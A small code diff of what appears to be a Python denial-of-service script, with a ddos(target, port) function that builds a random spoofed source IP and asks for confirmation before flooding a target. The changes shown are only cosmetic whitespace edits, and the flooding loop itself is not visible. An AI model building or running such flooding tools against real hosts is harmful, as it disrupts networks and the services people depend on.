@@ -5,7 +5,7 @@ src = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255
 source_port = 56666
 
 def ddos(target, port):
-    choice = input(f'Source port: {src}\nTarget IP: {target}\nTarget port: {port}\nDo you wish to continue? [Y/N]: ')#
+    choice = input(f'Source port: {src}\nTarget IP: {target}\nTarget port: {port}\nDo you wish to continue? [Y/N]: ')
     if choice.lower() == 'y':
         srcport = int(source_port)
         i=1
@@ -23,8 +23,7 @@ def ddos(target, port):
             sys.exit('\n')
         except:
             e = sys.exc_info()[1]
-            print(f'\n{e}')
-                
+            print(f'\n{e}')         
     else:
         print('Operation was cancelled.')
         sys.exit('\n')
